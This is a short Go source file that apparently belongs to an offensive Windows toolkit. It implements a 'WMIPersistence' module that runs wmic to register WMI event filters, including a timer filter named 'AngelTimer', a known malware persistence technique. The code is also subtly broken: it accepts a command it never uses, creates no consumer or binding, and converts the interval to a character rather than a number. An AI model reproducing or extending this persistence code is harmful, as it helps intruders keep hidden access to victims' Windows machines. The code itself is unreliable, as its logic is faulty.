package windows

import (
"os/exec"
)

type WMIPersistence struct{}

func NewWMIPersistence() *WMIPersistence {
return &WMIPersistence{}
}

func (w *WMIPersistence) CreateSubscription(name, command, filter string) error {
cmd := exec.Command("wmic", "/namespace:\\\\root\\subscription", "PATH", "__EventFilter", "CREATE", "Name="+name, "Query="+filter, "QueryLanguage=WQL")
return cmd.Run()
}

func (w *WMIPersistence) CreateTimerSubscription(name, command string, interval int) error {
filter := "SELECT * FROM __TimerEvent WHERE TimerID = 'AngelTimer' AND Interval = " + string(interval)
return w.CreateSubscription(name, command, filter)
}
